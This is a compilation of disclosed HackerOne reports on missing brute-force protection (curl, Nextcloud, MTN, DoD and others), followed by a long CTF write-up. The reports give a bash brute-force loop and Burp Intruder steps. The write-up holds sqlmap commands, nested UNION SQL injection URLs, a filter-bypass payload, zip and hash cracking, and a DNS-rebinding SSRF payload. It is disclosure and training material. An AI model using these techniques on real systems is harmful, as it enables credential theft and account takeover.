# Improper Restriction of Authentication Attempts

_17 reports — High/Critical, disclosed_

### [Improper Restriction of Authentication Attempts in cURL](https://hackerone.com/reports/3030158)

- **Report ID:** `3030158`
- **Severity:** Critical
- **Weakness:** Improper Restriction of Authentication Attempts
- **Program:** curl
- **Reporter:** @irfanmughal1122
- **Bounty:** - usd
- **Disclosed:** 2025-06-28T21:09:52.772Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
The authentication mechanism in cURL does not properly restrict the number of failed authentication attempts, allowing an attacker to brute-force credentials. This issue affects authentication-based requests and could lead to unauthorized access if an attacker successfully guesses a valid password.

## Affected Version:
cURL version: [Specify version]
Platform: [Specify OS and environment]
(curl -V output: [Attach output])

## Steps To Reproduce:

Use a valid username but an incorrect password to make an authentication request via cURL:

curl -u valid_user:wrong_password http://target-url.com

Observe that there is no lockout or delay after multiple failed attempts.

Automate the process using a brute-force script:

for i in {1..1000}; do curl -u valid_user:password$i http://target-url.com; done

If a correct password is found, the attacker gains unauthorized access.

## Supporting Material/References:

[Attach logs or screenshots showing multiple failed attempts without any lockout]

[Any relevant documentation that supports this claim]

## Impact:

Allows brute-force attacks against user accounts.

Potential unauthorized access leading to data breaches.

Can be exploited remotely if authentication is exposed.

## Recommended Fix:

Implement rate-limiting after multiple failed authentication attempts.

Introduce CAPTCHA or multi-factor authentication (MFA).

Enforce temporary account lockouts after a predefined number of failures.

## Severity: Critical 🚨
This vulnerability can be exploited remotely, leading to unauthorized access, making it a high-impact security risk

## Impact

Allows brute-force attacks against user accounts.

Potential unauthorized access leading to data breaches.

Can be exploited remotely if authentication is exposed.

---

### [Password reset endpoint is not brute force protected](https://hackerone.com/reports/1987062)

- **Report ID:** `1987062`
- **Severity:** High
- **Weakness:** Improper Restriction of Authentication Attempts
- **Program:** Nextcloud
- **Reporter:** @rullzer
- **Bounty:** 500 usd
- **Disclosed:** 2023-07-21T06:14:00.426Z
- **CVE(s):** CVE-2023-35172

**Vulnerability Information:**

Oversight of https://github.com/nextcloud/security-advisories/security/advisories/GHSA-v243-x6jc-42mp (https://hackerone.com/reports/1841665, but I can't judge the content there as it is not yet public).

In any case. The whole lostpassword flow is now annotated with bruteforce protection. Except the endpoint that actually matters. https://github.com/nextcloud/server/blob/master/core/Controller/LostController.php#L226-L229

An attacker can still happily try to brute force the token. Without getting throttled.

## Impact

The lostpassword flow is without actual bruteforce protection.

**Summary (team):**

Security advisory at https://github.com/nextcloud/security-advisories/security/advisories/GHSA-mjf5-p765-qmr6

---

### [Basic auth header on WebDAV requests is not bruteforce protected](https://hackerone.com/reports/1879549)

- **Report ID:** `1879549`
- **Severity:** High
- **Weakness:** Improper Restriction of Authentication Attempts
- **Program:** Nextcloud
- **Reporter:** @hackit_bharat
- **Bounty:** - usd
- **Disclosed:** 2023-06-02T04:18:38.749Z
- **CVE(s):** CVE-2023-32319

**Vulnerability Information:**

Hi Team,

I hope you are doing well.

Vulnerability Name :- Basic Authentication Bypass due to Lack of Rate Limit

Vulnerable URL :- https://efss.qloud.my/remote.php/dav/calendars/ha.ckitbharat3@gmail.com/app-generated--deck--board-5269/

Steps to Reproduce :- 1. Login --> Go to Tasks.
2. Copy private Link.
3. It looks like :- https://efss.qloud.my/remote.php/dav/calendars/ha.ckitbharat3@gmail.com/app-generated--deck--board-5269/
4. Open it in other browser .
5. It asks for username and password .
6. Username/email is in URL , enter same and for password enter random password.
7. Capture this request in burp suite.
8. There is an Auth header --> copy there value and see it's b64 encoded --> decode it --> create payloads of password and encode it as b64.
9. Send to intruder and select that position and paste the payload list.
10. Click on start attack and Boom! after few mins it got bypassed with Response code 200.

## Impact

1. Basic Authentication Bypass.
2. Full Account takeover because attacker can easily know the password through here because of brute forcing as no rate limit is there.

**Summary (team):**

Security advisory at https://github.com/nextcloud/security-advisories/security/advisories/GHSA-mr7q-xf62-fw54

---

### [weak protection against brute-forcing on login api leads to account takeover ](https://hackerone.com/reports/766875)

- **Report ID:** `766875`
- **Severity:** Critical
- **Weakness:** Improper Restriction of Authentication Attempts
- **Program:** Palo Alto Software
- **Reporter:** @zer0code
- **Bounty:** - usd
- **Disclosed:** 2022-08-29T18:23:08.457Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Weak protection against brute-forcing on login API: https://api.outpost.co/api/v1/login leads to account takeover on https://www.teamoutpost.com/
## Steps To Reproduce:
* Sign in on https://www.teamoutpost.com/
███
* redirect to https://app.outpost.co/sign-in to login
█████████
* test any login credentials and review the request to https://api.outpost.co/api/v1/login
███████
* Notice the difference between the wrong user "Username does not exist" and wrong password " Password does not match username" 
████
* first we need to brute-force on username to get some valid usernames 
█████████
* We can grep on "Username does not exist" 
██████
* Here is valid usernames without  "Username does not exist"
██████████
* Notice the API doesn't block me for many requests even I reached more than 33K request and continue 
████
* after we exported a list of valid usernames we can brute-force for password fore every username on the list
██████████
* I imported valid usernames as 1st payload 
██████
* for 2nd payload I can use a passwords list but I tried the simplest password that user can register with " 9 characters long "
███████
* we got some credentials even with ADMIN role
██████████

## Impact

account takeover

---

### [Brute Force of fabric-ca server admin account](https://hackerone.com/reports/411364)

- **Report ID:** `411364`
- **Severity:** High
- **Weakness:** Improper Restriction of Authentication Attempts
- **Program:** Linux Foundation Decentralized Trust
- **Reporter:** @xiaoc
- **Bounty:** - usd
- **Disclosed:** 2022-08-06T17:36:44.655Z
- **CVE(s):** -

**Vulnerability Information:**

## fabric-ca server
- Default configuration maxenrollments value -1(enable outside enrollment)
- Listening 0.0.0.0:7054(easily discoved and can be reached)
- No limit to wrong password try
Above conditions result in brute force to CA server admin account

## Impact

## Attack gain a high-level permissioned account to permissioned network and can add\delete\update\query

---

### [Full account takeover in ███████ due lack of rate limiting in forgot password](https://hackerone.com/reports/1059758)

- **Report ID:** `1059758`
- **Severity:** High
- **Weakness:** Improper Restriction of Authentication Attempts
- **Program:** U.S. Dept Of Defense
- **Reporter:** @takester
- **Bounty:** - usd
- **Disclosed:** 2022-04-20T20:17:46.008Z
- **CVE(s):** -

**Vulnerability Information:**

##Steps:
1. Visit the link https://www.██████/██████████and enter the valid ████████.
2. You will be redirect to the page where it will ask you to fill your ████████ and ████████ that you get in your mail.
3. Enter the wrong ███ and intercept the request.
4. Then bruteforce the ███.(You can use burp intruder)
5. After valid ████████ it will aks you to create new password

##Request that I intercept
POST ███ HTTP/1.1
Host: www.███████
Connection: close
Content-Length: 197
Cache-Control: max-age=0
sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"
sec-ch-ua-mobile: ?0
Origin: https://www.███████
Upgrade-Insecure-Requests: 1
DNT: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://www.█████████/█████████
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,mr-IN;q=0.8,mr;q=0.7,hi;q=0.6
Cookie: [value]

██████████&██████=[████████]

## Impact

An attacker can takeover victim account if he has valid email related to the victim.

---

### [No rate limit lead to otp brute forcing](https://hackerone.com/reports/1060541)

- **Report ID:** `1060541`
- **Severity:** High
- **Weakness:** Improper Restriction of Authentication Attempts
- **Program:** MTN Group
- **Reporter:** @aliyugombe
- **Bounty:** - usd
- **Disclosed:** 2021-08-16T19:57:01.452Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Hello.
There is no rate limit protection in the endpoint https://mtnonline.com/nim/submit , Which could lead to brute force otp code.

## How To Reproduce:
Visit https://mtnonline.com/nim and complete all the required field and submit.
when next page load, user will be ask otp code.
Enter any five digit number and intercept the request using burp suit.
Send the request to intruder and clear all the payload except for otp.
Select brute forcer in payload type and clear the alphabetic character in character set and leave only digit.
In the min. length and max. length enter 5.
Click on attact button.

In the attached image, all the response code where  303 which means see other, that is means try again.
If rate limit is working, from 3 to 4 request, their response should be 429 means too many request.

## Supporting Material/References:

  * [attachment / reference]


##Thanks

## Impact

Attacker can send unlimited request before code the code to expire and guess the correct otp since it can be 5 minutes to expire.

---

### [Grinchs website takendown with various other exploits](https://hackerone.com/reports/1069034)

- **Report ID:** `1069034`
- **Severity:** Critical
- **Weakness:** Improper Restriction of Authentication Attempts
- **Program:** h1-ctf
- **Reporter:** @archerl
- **Bounty:** - usd
- **Disclosed:** 2021-03-02T17:57:05.507Z
- **CVE(s):** -

**Vulnerability Information:**

# The HackyHolidays
This is my first HackerOne CTF challenge writeup.

Contents:

(flag1): Day 1 (Check the files, robots.txt)

(flag2): Day 2 (one more :) jquery.min.js)

(flag3): Day 3 (People Rater)

(flag4): Day 4 (Brute Force, Swag Shop)

(flag5): Day 5 (Brute Force, Secure Login)

(flag6): Day 6 (Brute Force, My Diary)

(flag7): Day 7 (Brute Force, Hate Mail Generator)

(flag8): Day 8 (Brute Force, Forum)

(flag9): Day 9 (Brute Force, Evil Quiz)

(flag10): Day 10 (Brute Force, Signup Manager)

(flag11): Day 11 (Day 17th for me ;( ) (Brute Force, Follow the Link in Signup-Manager) Sheesh!!!

(flag12): Day 12 (TAKE DOWN GRINCH! Follow the Link provided in 11)


## Flag 1 
This was a fairly easy flag to find. As hacker instinct, the first place to look is the website's structure and that can be found in /robots.txt

**Flag found**: 

[img](https://i.imgur.com/I87dIDS.png)
{F1138714}


## Flag 2
This other flag is found in not so very traditional places. Like a good CTF player, I check for EXIF data in the images posted: `grinch-keepout` & `grinch-networks`, well nothing there. So I refreshed the page again and looked at one of the requests and saw one of the requests being made to `jquery.min.js`.
To save time, typed `flag` as a keyword in the response tab in the burp suite to find it, nothing. So I thought of going for a manual scavenger hunt, this snippet caught my attention.

```javascript=
   , h1_0='la', h1_1='}', h1_2='', h1_3='f', h1_4='g', h1_5='{b7ebcb75', h1_6='8454-', h1_7='cfb9574459f7', h1_8='-9100-4f91-'; document.getElementById('alertbox').setAttribute('data-info', h1_2 + h1_3 + h1_0 + h1_4 + h1_2 + h1_5 + h1_8 + h1_6 + h1_7 + h1_1); document.getElementById('alertbox').setAttribute('next-page', '/ap'+ 'ps'); function b(e, t, n) {
            var r, i, o=(n=n||E).createElement("script"); if(o.text=e, t)for(r in c)(i=t[r]||t.getAttribute&&t.getAttribute(r))&&o.setAttribute(r, i); n.head.appendChild(o).parentNode.removeChild(o)
        }
```

The flag is distributed in the variables, so if you have time you can manually patch the variables together to get the flag
```h1_2 + h1_3 + h1_0 + h1_4 + h1_2 + h1_5 + h1_8 + h1_6 + h1_7 + h1_1```

Or you can go a little smart and call the flag by its element from the console in dev tools. The call looks very difficult to understand but its nothing complicated, all you need to do is just call the flag with its elementId: `alert box`, like this: 
```javascript=
console.log(document.getElementById('alertbox'))
```

**Flag Found**:

[img](https://i.imgur.com/EmnW37d.png)
{F1138715}

## Flag 3

This one is also fairly easy. The new directory provided to look for `/apps` is the key.
(In the source however there are mysterious blank spaces)

One can only see how the people are rated by grinch in `people-rater`. There are names. But if you look closely in the responses for the `people-rater` you will notice that each person has an ID base64 encoded of course. First in the list "Tea Avery" happens to have an id `eyJpZCI6MH0=` which when decoded is `{id:"2"}`, I wonder who `id:"1"` is. 

**Flag Found**:
[img](https://i.imgur.com/gPAS5sH.png)
{F1138715}

## Flag 4

This flag is rather trivial if not difficult to find. `Try and find a way to pull the Grinch's personal details from the online shop.` As the hint gives away to find about grinch and bypass login. So the first thought is to look in the source code, nothing in there just some simple JQuery, with rather funny id names: `alert alert-danger` kind of throws me off the game, lol!. Anyhow the key here is an enumeration. Look at the API, so I guessed the `user` path `sawg-shop/api/user`. But it throws in the: 

```json=
{
"error":"Missing required fields"
}
```

So I tried guessing params, nothing worked. So I ran `Arjun` a tool by som3d3v, to find missing params, luckily the UUID was the param I was looking for, what next? I thought of doing API brute-forcing. Using one of the seclist's API lists I ran it to the endpoint.....waiting.... It found another 200 OK response on sessions `sawg-shop/api/sessions`. There are various `keys` along with it, but there  is one which is the longest which when decoded gives:

```json=
{
"user":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043",
"cookie":"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="
}
```

Here we have got our `UUID` param value.

**Flag Found**:

[img](https://i.imgur.com/uDHRBGR.png)
{F1138719}

## Flag 5

I see another login page but this time the hint is very specific telling us to `Try and find a way past the login page to get to the secret area.`. As usual, I go on for looking at any `hidden` fields if any in the source code, nothing apart from yet another **element named** `alert alert-danger`. So another brute force? I mean the hint was very obvious since it was telling if the username is valid or not. Pulling down the longest username list, I start a brute force. Nothing found, actually, there was, I just forgot to put grep in place.

So `user found: access` what about the pass, I try again with a small list this time. 207p-probable password list, and coincidently it worked.

```
user: access
password: computer
```

What next, once logged in there is this message.:

```
No Files To Download
```

Looking around the page, nothing. Check the responses, I see a cookie, I attach the cookie and then take it to `s3cr3t-ar3a`, nothing. what's next? Took a closer look at the cookie, so I try to decode it:

```json=
{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":falsZX0%3D
```

Ah, so we need to fix the cookie. Fixing it with setting ``"admin":true}`` and refreshing it, we see the file:

```
my_secure_files_not_for_you.zip
```

I see a Zip file. At first, I thought it was a polyglot, but it's a normal zip file that is password protected. Another brute force? why not.

I download the fcrackzip program, to brute force the list. Seeing how the main concept of the CTF was to teach brute force and not to test our wordlists, I took a more conventional approach, `rockyou.txt`

```bash
fcrackzip -u -D -p rockyou.txt my_secure_files_not_for_you.zip  
```

**"hahahaha" it worked, I am the ultimate hacker**. 

No its the password `hahahaha`. It took like a second to break, so I was right the theme was to test brute force and not wordlist.

**Flag found**:

[img](https://i.imgur.com/Wfwz7J7.png)
{F1138721}

## Flag 6

Day 6, flag 6. We need to find the missing todo in the calendar. The site seems very nice, of course, nothing **Grinch** worthy todo, lol.

So following the lines of previous CTFs, the only thing that seemed **SUS**(among us) `/my-diary/?template=entries.html`. 

*So drop your crocks and grab your socs, we have another brute force in our hand, Ffuf to rescue. Nope..... nothing.....*

So my traditional wordlist failed, how about dirsearch, so I copied the dirsearch wordlist, fixed it with -D flag for FFuf to use and voila, `__index` worked. Very sneaky.

So the source finally reveals itself.

```php=
<?php
if( isset($_GET["template"])  ){
    $page = $_GET["template"];
    //remove non allowed characters
    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
    //protect admin.php from being read
    $page = str_replace("admin.php","",$page);
    //I've changed the admin file to secretadmin.php for more security!
    $page = str_replace("secretadmin.php","",$page);
    //check file exists
    if( file_exists($page) ){
       echo file_get_contents($page);
    }else{
        //redirect to home
        header("Location: /my-diary/?template=entries.html");
        exit();
    }
}else{
    //redirect to home
    header("Location: /my-diary/?template=entries.html");
    exit();
}
```

Very clever, so the admin.php is renamed to `secretadmin.php` and moreover they get filtered out from string replace method but the flaw is its not recursive, Ahh! a well-crafted payload.

[img](https://i.imgur.com/RxP3NpN.png)
{F1138722}

So somehow, we need to come up with a file name, that when stripped out of these matching keyword `admin.php` and `secretadmin.php`. 

The payload would look like: **secretadmsecretadmadmin.phpin.phpin.php**

secretadmsecretadmadmin.phpin.phpin.php =>
secretadmsecretadm~admin.php~in.phpin.php =>

secretadm~secretadmin.php~in.php => secretadmin.php

**Flag found**:

[img](https://i.imgur.com/I7oYV56.png)
{F1138723}

## Flag 7
This was also one of the trickiest flags I came across (till now). We start with `hate-mail-generator`, so in this stage, we have two options we can either view the `Guess What` link or create a hate mail campaign of our own.

Hmm ``{{name}} & {{template: }}`` almost reminded me of `Handlebars` (a way of making dynamic webpages, where you would feed the variable names to a webpage of .hbs extensions). I knew something has to be up with it. 

Also while reviewing the `Create New`, I noticed there were two furthermore possibilities, preview or create (this always showed, `Sorry but you've run out of credits`), and with preview the name was always set to Alice, because of one of the hidden input field:

```htmlembedded=
<input type="hidden" name="preview_data" value='{"name":"Alice","email":"alice@test.com"}'>
```

A usual directory brute force using 'dirseach' to rescue again. The directory found `/templates`, which just confirmed my suspicions of handlebars, usage. Now to solve the flag we need to include the admin header `38dhs_admins_only_header.html`.

[img](https://i.imgur.com/DZharLs.png)
{F1138725}

seeing the `Guess what` param it was clear that we have two ways of including the flag (`name`, `template:`), it seems 3 but the footer/header.html flags are the same.
```json=
{{template:cbdj3_grinch_header.html}} Hi {{name}}..... Guess what..... <strong>YOU SUCK!</strong>{{template:cbdj3_grinch_footer.html}}
```

using the way ``{{temaplte:38dhs_admins_only_header.html}}`` in `create new` via `preview feature`, nothing. The other variable name, which I changed from Alice, to ``{{temaplte:38dhs_admins_only_header.html}}`` which looked something like this and viola..

```json=
{"name":"{{template:38dhs_admins_only_header.html}}","email":"alice@test.com"}
```

**Flag Found:**

[img](https://i.imgur.com/U49TH38.png)
{F1138726}

## Flag 8

Ohk, not gonna lie, this was something unexpected. I knew there were only two users, but the passwords, I didn't know. 
A simple directory brute force scan on the CTF link, reveals another login page `/phpmyadmin` apart from the one `/login`. Time for some brute force, I took the small password lists and tried them with the combination of, but all in vain.

```json=
{
    user: grinch
    password: $checking$
}

and 

{
    user: max,
    password: $checking$
}
```

[Github](https://github.com/Grinch-Networks) source code, took some time to find it, after some hints from team-mates. The code looks clean and fine, but with recent commits. Inspecting further in the code, one can find 4 commits, go through each one by one, `small fix` caught my attention. The code snippet 

[img](https://i.imgur.com/qYHxsQE.png)
{F1138727}

I don't know PHP but after seeing `DbConnect` and several minutes of googling later, I thought of them being creds, so I tried logging in `phpmyadmin` page and it worked.

Navigating to the user's section, we can find both users and their passwords. But passwords are MD5 hash encrypted. No worries brute force to rescue. 


[img](https://i.imgur.com/V5wAEZJ.png)
{F1138728}

Now, time to go back to `/login` page and log into Grinch's account.

**Flag found**:

[img](https://i.imgur.com/Rp2Xuno.png)
{F1138729}

## Flag 9
On day 9, we find ourselves being tested by Grinch, no like literally, welcome to the evil quiz. 

I begin my testing with directory brute-forcing, nothing of any particular interest actually. How about taking the evil quiz, doesn't allow a name less than 3 chars, also is sensitive to `'or;` since on any other responses it would respond as `There is 1 other player(s) with the same name as you!` but in this, it responded with **I am not evil** and also `There is 0 other player(s) with the same name as you!` lol, I see, SQLi it is.

So, the name gets perfectly reflected in the quiz area, it's after the `302 Found ` redirect when it reflects any change. Interesting, so in order to get a reflection, we need to use both the requests, I see.

So I bring out every hacker's fav SQLmap... with a very difficult query 

```
sqlmap -u https://hackyholidays.h1ctf.com/evil-quiz --data "name=archerl" -p "name" --method POST --second-url "https://hackyholidays.h1ctf.com/evil-quiz/score" --cookie="session=<YourCookie>" -D quiz --dump
```

It took like forever to end though, but it ended. So we have the creds from the very long SQLmap run

```
admin:S3creT_p4ssw0rd-$
```

**Flag found**:

[](https://i.imgur.com/EFAeTG6.png)
{F1138731}

## Flag 10

We have another login, ever since the secure-login, I check for each stage's source code on Github lol. So we look at the source code while simultaneously running the directory brute forcing on the web app. => nothing.

so we check the page source, and it's easy to miss at first but we see the 

```htmlembedded=
<!-- See README.md for assistance -->
```

comment, very sneaky. So we download the README File.
`https://hackyholidays.h1ctf.com/signup-manager/README.md`

[img](https://i.imgur.com/zDqQZ4y.png)
{F1138732}

Reading the contents of the `README.md` file, a zip file is being mentioned, can we download a zip file? Yeah we can 

`https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip`

[img](https://i.imgur.com/SZGXcQ0.png)
{F1138733}

So we have downloaded the zip file and let's see if we can see the contents of it. (Update: Adam, reuploaded the zip file, spent an hour questioning my abilities to read PHP code) anyhow the new zip file has more files now and particularly index.php caught my attention

so to be admin, we need a special cookie and the fact that `user.php` is available on sever that means `admin.php` has to be too, but to access that page we need a special cookie. How to get that cookie? as mentioned in `README.md` on line  `6) You can make anyone an admin by changing the last character in the users.txt file to a Y` and also in the code 


```php=
if( isset($_COOKIE["token"]) ){
    foreach( $all_users as $u ){
        if( $u["cookie"] === $_COOKIE["token"] ){
            if( $u["admin"] ){
                $page = 'admin.php';
            }else{
                $page = 'user.php';
            }
        }
    }
}
```

How to set the admin value in function `build users` as Y?

```php=
function buildUsers(){
    $users = array();
    $users_txt = file_get_contents('users.txt');
    foreach( explode(PHP_EOL,$users_txt) as $user_str ){
        if( strlen($user_str) == 113 ) {
            $username = str_replace('#', '', substr($user_str, 0, 15));
            $users[$username] = array(
                'username' => $username,
                'password' => str_replace('#', '', substr($user_str, 15, 32)),
                'cookie' => str_replace('#', '', substr($user_str, 47, 32)),
                'age' => intval(str_replace('#', '', substr($user_str, 79, 3))),
                'firstname' => str_replace('#', '', substr($user_str, 82, 15)),
                'lastname' => str_replace('#', '', substr($user_str, 97, 15)),
                'admin' => ((substr($user_str, 112, 1) === 'Y') ? true : false)
            );
        }
    }
    return $users;
}
```

[img](https://i.imgur.com/uD0f1tY.png)
{F1138734}

The question was how? though...after a lot of brainstorming, I saw the `intval()` function.

```php=
if (!is_numeric($_POST["age"])) {
    $errors[] = 'Age entered is invalid';
}
if (strlen($_POST["age"]) > 3) {
    $errors[] = 'Age entered is too long';
}
$age = intval($_POST["age"]);
```

How to overflow it though? I tried many values like 999, 1000 but it threw the `'Age entered is too long'` because of the string length check. 

After more brainStorming `1e5` so the input becomes something like this, 

```
age=1e5 and lastname=YYYYYYYYYYYYYYYYYYYYYYYYYYYYY
```

so many Y's are there to ensure the value of admin is set to Y, in case of overflow. `1e5` is a scientific notation and blows up to 100000, thats the way to enlargen the user_string and push Y to 113 with last name.

Intercept the request and change the value of age and signup with new creds.

[img17](https://i.imgur.com/UpkZTbA.png)
{F1138735}

Voila!!

[img18](https://i.imgur.com/6FQBQ6W.png)

{F1138736}





## Flag 11
This one by far was the most difficult one. I had to spring up a discord bot to keep track of the brute force.  

So we go to the `/r3c0n_server_4fdk59` on day 11, (for me its 30th December lol), We see `/api` as one of the endpoints, and some images arranged based on their years. 

1. So first thing first as every CTF player does, API enumeration (fuzzing) and ExifTool analysis on the images. => nothing


The images had a funny way of being fetched, they were rather `base64` encrypted:

```
eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL2RiNTA3YmRiMTg2ZDMzYTcxOWViMDQ1NjAzMDIwY2VjLmpwZyIsImF1dGgiOiJiYmYyOTVkNjg2YmQyYWYzNDZmY2Q4MGM1Mzk4ZGU5YSJ9
```

once decrypted it looks something like this:
```json=
{"image":"r3c0n_server_4fdk59\/uploads\/db507bdb186d33a719eb045603020cec.jpg","auth":"bbf295d686bd2af346fcd80c5398de9a"}
```

So maybe this works like an auth? I attached it to my request as a `cookie= token=<value>` nothing.


### API (part)

Upon visiting it we can notice there are a set of response codes and their meanings respectively. 

There are two parameters we can try something on `hash` and `data`. I tried for XSS, and SSRF nothing. At last, I tied SQLi with SQLmap and it worked.


```
sqlmap -u "https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k" --risk 3 --level 3
```


[img19](https://i.imgur.com/R540OUq.png)
{F1138737}

The dumps provide us with nothing new. Bummer!! What's next? I thought of using the payload in the browser.

I found a **XSS**  thought this might get something lol, nothing

**STEP 0**: The SQli

`
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=hash=-7611%27%20UNION+SELECT%20NULL,NULL,%27%3Cscript%3Ealert(1)%3C/script%3E%27--%20-
`

After some hints in the server and Adam himself, it was clear that SQLi with an SQLi has to be used to get an auth token from the server, and then some more help from my fellow hacker in Hacker101 discord, it came down to brute-forcing the API but with new set of generated auths. In simple terms:

(SQLi, within an SQLi)

**URL**=`
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=8291%27+UNION+SELECT+%22%27+union+select+1,2,%27../api/something%27%23%22,null,null%23
`

This link will generate a response that will have a nonexsisting image, which would look like this

```htmlembedded=
<div class="col-md-4">
<img class="img-responsive" src="/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3NvbWV0aGluZyIsImF1dGgiOiJiNGQ4ZTEzOWNkMWY4N2U5YjRmY2QyNmM2MmUyNzQyZiJ9">
</div>
```

which when decoded is nothing but 

```json=
{"image":"r3c0n_server_4fdk59\/uploads\/..\/api\/something","auth":"b4d8e139cd1f87e9b4fcd26c62e2742f"}
```



So every time **URL** is sent one has to extract the token from this `img` tag and send that again to search query in this fashion.

**STEP 1**: Take the fuzzed URL

URL=`
...link...hash=8291%27+UNION+SELECT+%22%27+union+select+1,2,%27../api/`**FUZZ**`%27%23%22,null,null%23
`

**STEP2**: Send the request to the website, from the response fetch the value of data from the img tag (`src` value), and then send the request again to capture the response.


**STEP3**: Check for the response, we get "Expected HTTP status 200, Received: 400" as the response for most of the keywords, so the if the condition would be like anything but `Expected HTTP status 200, Received: 404
`

[img20](https://i.imgur.com/RLAz4iH.png)
{F1138738}

Using this method, found out that there exists two paths, one `user` and other `sleep` which threw `Invalid content type detected`

[img21](https://i.imgur.com/C7Uo3DO.png)
{F1138739}

So now we have a valid path, what's next? maybe there are more paths to it => Nothing

How about params? so the same URL as in STEP 1, but slight change.


**STEP 4**: Take the fuzzed URL

URL=`
...link...hash=8291%27+UNION+SELECT+%22%27+union+select+1,2,%27../api/user?`**FUZZ**`%27%23%22,null,null%23
`

repeat **step 2 and 3**, with a change that we are now getting `Expected HTTP status 200, Received: 400`.

Using this method, found out that there exists two paths, one `username` and other `password` and `sleep` which threw `Invalid content type detected` 

[img22](https://i.imgur.com/65MkG4o.png)
{F1138740}

well now we have found two valid params, so I am assuming we need to fuzz for them as well. As a basic instinct, I tried for an SQLi -> nothing.

but the URL did seem to be funny for `'` & `%` so I enumerated more, and came back to this stage after 3 days lol. So the catch is to use the alphabet appended by `%` that way one can guess whether or not the given word is a substring of the valid user or password.

like for any alphabet + `%` like a `...link...user?username=a%..` the response would be like `Expected HTTP status 200, Received: 204`, so as always we go for if condition where the response is anything but `Expected HTTP status 200, Received: 204` and we find `g%` to be one of it. hmmm very interesting.

so the wordlist for this would go like? 

**STEP5** 

a,b,c.....**g**..............ga...........**gr**...**gri**..........**grinch**.....**grinchadmin**.......grinchadmina....grinchadminaa

so we know the user name is grinch, very funny... How about password? I am assmuing this would involve numbers, this ran for like a so long, lol. The wordlist looked like

**STEP6** 

a,b,c,d,e,..**s**...s1,s2,s3,**s4**....**s4t**.....you know it finally ended on **s4nt4sucks**, typical Grinch!

```
grinchadmin:s4nt4sucks
```

So finally we have the ID and password lets go to the login in `/attack-box`, took me 7 days to figure this one out.

**Flag found**:

[img23](https://i.imgur.com/S8ouhJN.png)
{F1138741}

## Flag 12

And finally few hours before the final deadline for the report submission, I try the flag 12.

We have the Santa's IP addresses, like previous flag this also has some wierd URL fetch as well. The `base64` encoded value, I wonder what it could be.

hash:
```
eyJ0YXJnZXQiOiIyMDMuMC4xMTMuNTMiLCJoYXNoIjoiMjgxNGY5YzczMTFhODJmMWI4MjI1ODUwMzlmNjI2MDcifQ==
```

decoded looks like this:

```
{"target":"203.0.113.53","hash":"2814f9c7311a82f1b822585039f62607"}
```

Hmmm, now as per HackerOne's tweet the hint is hash and the salt! so after brief thinking and playing with the hash, I tried finding out the salt using the brute force methodology. Hashcat to the rescue! we know what the hashes are for (assuming IPs, since its the only logical thing) and the salted hash. Using the wordlist rockyou.txt, it was matter of seconds for the hash to break.


[img24](https://i.imgur.com/LhbGiKD.png)
{F1138742}

`mrgrinch463` is the salt. what next? we need to DOS Grinch right? we are on Santa's side. We need to encrypt the 127.0.0.1 address with salt to destroy ourselves (grinch's server).

using this [website](http://md5.my-addr.com/md5_salted_hash-md5_salt_hash_generator_tool.php) we get the slated hash value.

[img25](https://i.imgur.com/nFjTaAU.png)
{F1138743}

Time to generate the payload.

```
{"target":"127.0.0.1","hash":"3e3f8df1658372edf0214e202acb460b"}
```

The Grinch's server identified it as the localhost and abandoned the attack... so lets try IPv6 versioning, "localhost" => nothing!

After several hints later in the discord channel, someone recommended the YouTube video of [Watch owning the clout from Nahamsec and daeken](https://www.youtube.com/watch?v=o-tL9ULF0KI).... DNS rebinding it is, still little shaky on the concept and several more hints later, but I knew what to do. Something on the grounds of, like xcy.com redirects to `127.0.0.1` like so 127.0.0.1 is blocked ...but a random domain is not, so that passes the localhost check...but if the domain later redirects to localhost, it will attack it.

[img26](https://i.imgur.com/GuBijAO.png)
{F1138744}

After generating the URL for attack and respective hash
```
{"target":"01020304.7f000001.rbndr.us","hash":"69c31cdcfad3ef1deb652f4aca52d2cc"}
```

encoded `base64` version

```
eyJ0YXJnZXQiOiIwMTAyMDMwNC43ZjAwMDAwMS5yYm5kci51cyIsImhhc2giOiI2OWMzMWNkY2ZhZDNlZjFkZWI2NTJmNGFjYTUyZDJjYyJ9
```

It doesn't work the first time and second time it redirects to 1.2.3.4.... hmmm

[img27](https://i.imgur.com/jihbfMs.png)
{F1138745}


Time to attack the Grinch again! but wait for 15 seconds...lol


So the 4th time the payload works and voila!


**Flag Found**:

[img28](https://i.imgur.com/wUZDrYw.png)
{F1138746}

## Conclusion

The CTF was not very easy, specially the last ones, but it was a thrill ride! Learned many things, intreacted with many talented people.

Kudos to Adam and Ben for such a creative CTF! hats off!! I would love to win the best report challenge but I am content with the h1-ctf badge as well :)

## Impact

Holidays Saved!

---

